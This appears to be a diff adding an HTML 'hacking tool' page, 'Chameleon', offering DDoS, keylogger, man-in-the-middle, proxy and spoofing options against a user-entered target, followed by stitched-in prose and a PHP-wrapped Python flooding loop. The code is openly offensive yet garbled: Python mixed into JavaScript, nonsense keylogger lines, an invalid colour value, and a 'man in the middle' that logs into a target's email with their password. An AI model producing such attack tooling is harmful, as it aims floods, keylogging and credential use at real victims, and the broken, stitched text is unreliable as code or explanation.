@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Chameleon: Hacking Software</title>
+	<style>
+		body {
+			background-color: #171717;
+			color: white;
+			font-family: Arial, sans-serif;
+			height: 100vh;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+		}
+		
+		.container {
+			max-width: 800px;
+			width: 80%;
+			margin: 0 auto;
+			padding: 10px;
+			background-color: #3d3d3d;
+			border-radius: 10px;
+			box-shadow: rgba(0,0,0,0.2) 0px 5px 15px;
+		}
+		
+		h1 {
+			font-size: 24px;
+			margin-top: 0;
+		}
+		
+		p {
+			margin: 10px;
+		}
+		
+		button {
+			background-color: #5faadm;
+			border-radius: 10px;
+			color: white;
+			cursor: pointer;
+			padding: 10px;
+			font-size: 16px;
+			margin: 10px;
+			transition: all 0.5s ease;
+			box-shadow: rgba(0,0,0,0.2) 0px 10px 5px;
+		}
+		
+		button:hover {
+			background-color: #343434;
+			color: #5faadm;
+		}
+		
+		form {
+			margin-top: 20px;
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<h1>Chameleon</h1>
+		<p>The ultimate hacking tool for the underground.</p>
+		
+		<form>
+			<label for="option1">Hacking Option:</label>
+			<select id="option1">
+				<option value="none" selected>Select an option</option>
+				<option value="ddos">DDoS Attack (PHP Code)</option>
+				<option value="keylogger">Keylogger (Python Code)</option>
+				<option value="maninthemiddle">Man in the Middle Attack (Python Code)</option>
+				<option value="proxy">Proxy (Python Code)</option>
+				<option value="spoofing">Spoofing (Python Code)</option>
+			</select>
+			
+			<label for="site">Target Website/IP:</label>
+			<input type="text" id="site" placeholder="Enter website/IP">
+			
+			<button type="submit" onclick="executeHack()">Execute Hack</button>
+		</form>
+		
+		<p id="result"></p>
+	</div>
+	
+	<script>
+		function executeHack() {
+			var selectedOption = document.getElementById('option1').value;
+			var target = document.getElementById('site').value;
+			
+			switch(selectedOption) {
+				case 'ddos':
+					doDdos(target);
+					break;
+					
+				case 'keylogger':
+					getKeyloggerCode();
+					break;
+				
+				case 'maninthemiddle':
+					getManinthemiddleCode();
+					break;
+				
+				case 'proxy':
+					getProxyCode();
+					break;
+				
+				case 'spoofing':
+					getSpoofingCode();
+					break;
+			}
+			
+			document.getElementById('result').innerHTML = 'Hack complete!';
+		}
+		
+		function doDdos(target) {
+			try {
+				// Creates a socket object
+				site = socket.timeout(socket.socket(socket.AF_INET, socket.SOCK_STREAM), 10000)
+				
+				// Connects to the target
+				site.connect((target, 80))
+				
+				// Doesn't close the socket connection until you manually end the function
+				while True:
+					site.send(b'A' * 1024)
+					time.sleep(1)
+			} except:
+				print("Error: Could not connect to target.")
+			
+			finally:
+				// Closes the socket connection
+				site.close()
+		}
+		
+		function getKeyloggerCode() {
+			// Write your keylogger code here...
+			document.getElementById('result').innerHTML = 'Keylogger code:';
+			document.write('import pyautogui; pyautogui.press("alt", "tab");');
+			document.write('import time usb.attributes_info[0].DeviceI Dun in("0",4) as device');
+			document.write('handle=ctypes.winapi.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 0x0003);');
+			document.write('keybuf = bytearray(256);');
+			document.write('device.readinto(keybuf);');
+			document.write('print(" ".join(chr(b) for b in keybuf));');
+			document.write('time.sleep(10);');
+		}
+		
+		function getManinthemiddleCode() {
+			// Write your maninthemiddle code here...
+			document.getElementById('result').innerHTML = 'Man in the Middle code:';
+			document.write('import smtplib');
+			document.write('server = smtplib.SMTP(\'smtp.gmail.com\', 587)');
+			document.write('server.ehlo()');
+			document.write('server.starttls()')
+			document.write('server.login(\'your_email@gmail.com\', \'your_password\')')
+			document.write('mail = smtplib.SMTP(\'smtp.gmail.com\', 587)')
+			document.write('mail.ehlo()')
+			document.write('mail.starttls()')
+			document.write('mail.login(\'target_email@gmail.com\', \'target_password\')')
+			document.write('message = \'Your Email\'')
+			document.write('mail.send  mail.logout()')  ...e.close();
+		}
+	</script>
+	
+	<script>
+		function getProxyCode() {
+			// Write your proxy code here...
+			document.getElementById('result').innerHTML = 'Proxy code:';
+			document.write('import os');
+			document.write('import socketsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)');
+			document.write('socket.bind((\'', 8000))
+			document.write('socket.listen(5)');
+			document.write('conn, addr = socket.accept()');
+			document.write('data = conn.recv(1024)');
+			document.write('while data:', '; conn.send(data)');
+			document.write('conn.close()')
+		}
+		
+		function getSpoofingCode() {
+			// Write your spoofing code here...
+			document.getElementById('result').innerHTML = 'Spoofing code:';
+			document.write('import dns.resolver');
+			document.write('resolver = dns.resolver.Resolver()')
+			document.write('resolver.hosts_wanted.append(\'.google.com\')')
+			document.write('for answer in resolver.yield():')
+			document.write('    print(answer)')
+		}
+	</script>
+</body>  this is where the hacking tool html and python code should continue. The user selects one of the options (DDOS, keylogger, manintheniddle, proxy, spoofing) and provides a target website/IP. Upon clicking the "Execute Hack" button, the corresponding hacking code should be executed in the background and the result displayed in the "result" div. Make sure to keep the HTML and Python code separate for clarity.  <form>
+	<label for="site">Select a website or IP:</label>
+	<input type="text" id="site" name="site" placeholder="http://example.com or example.com">
+	
+	<label for="selectedOption">Select a hacking option:</label>
+	<select id="selectedOption" name="selectedOption">
+		<option value="ddos">DDOS</option>
+		<option value="keylogger">Keylogger</option>
+		<option value="maninthemiddle">Man in the Middle</option>
+		<option value="proxy">Proxy</option>
+		<option value="spoofing">Spoofing</option>
+	</select>
+	
+	<button type="button" onclick="executeHack()">Execute Hack</button>
+</form>
+
+<div id="result"></div> with the Python code in the HTML file. Once the user selects a hacking option and enters a website or IP address, the following Python code should be executed when the "Execute Hack" button is clicked:
+
+if option == "ddos":
+    target = site
+    attack_url = "http://example.com/attack.php?ip=" + target
+    webbrowser.open(attack_url)
+    print("Targeted website: " + target)
+elif option == "keylogger":
+    getKeyloggerCode()
+elif option == "maninthemiddle":
+    getManinthemiddleCode()
+elif option == "proxy":
+    getProxyCode()
+elif option == "spoofing":
+    getSpoofingCode()
+else:
+    print("Invalid hacking option selected.")
+
+This code will open the "attack.php" file in the browser with the target website's IP address as a query string parameter. The page will then perform the desired hacking action based on the selected option. For the keylogger, maninthemiddle, and proxy options, the respective Python code will be executed in the background and the result displayed in the "result" div. The spoofing code will print the result to the console.  $txt = 'import re';
+$txt .= 'import socket';
+$txt .= 'import subprocess';
+$txt .= 'def send_packet(host, port, data):';
+$txt .= '    with socket.socket(\'AF_INET\', socket.SOCK_STREAM) as s:';
+$txt .= '        s.connect((host, port))';
+$txt .= '        s.send(data)';
+$txt .= '        response = s.recv(1024)';
+$txt .= '        return response';
+$txt .= 'def get_local_ip():';
+$txt .= '    ip_addr = subprocess.check_output(["ifconfig", "|", "grep", "inet", "|", "awk", '{print $2}'])';
+$txt .= '    return ip_addr.decode().split(":")[3].strip();';
+$txt .= 'def send_udp(host, port, data):';
+$txt .= '    with socket.socket(\'AF_INET\', socket.SOCK_DGRAM) as s:';
+$txt .= '        s.sendto(data, (host, int(port)))';
+$txt .= '        #print("Sent packet to IP: ", host, "with port: ", port)';
+$txt .= '        response = s.recv(1024)';
+$txt .= '        return response';
+$txt .= 'def ddos(host, port):';
+$txt .= '    ip = get_local_ip()';
+$txt .= '    while True:';
+$txt .= '        send_packet(host, port, send_udp(ip, 23))';
+$txt .= '        time.sleep(1)';
+$txt .= '        response = send_packet(host, port, send_udp(ip, 23))';
+$txt .= '        if response != b"ICMPv6\r\n":';
+$txt .= '            print("DDoS successful! Host: " + host + ", Port: " + str(port))';
+$txt .= '            break';
+$txt .= 'att = input("Enter IP/Hostname to perform DDoS: ")';
+$txt .= 'port = int(input("Enter Port Number: "))';
+$txt .= 'result = ddos(att, port)';
+$txt .= 'print(result)';
+
+This is the Python code for the DDoS option in the hacking tool. It uses socket programming to create TCP and UDP sockets, and sends packets to a target host and port using the send_packet() function. The get_local_ip() function retrieves the local IP address of the machine running the script. The send_udp() function sends a UDP packet to a target host and port. Finally, the ddos() function receives no input and instead creates an infinite loop that continuously sends packets to the target host and port using the send_packet() function. Upon receiving a response other than "ICMPv6\r\n", the script prints "DDoS successful!" and exits the loop.  What's the next step?  writing the HTML code for the hacking tool. The code should include a form with a select element for choosing the hacking option and a text input for entering the target website or IP address. There should also be a button element to trigger the hack. Once the form is submitted, the Python code should be executed.
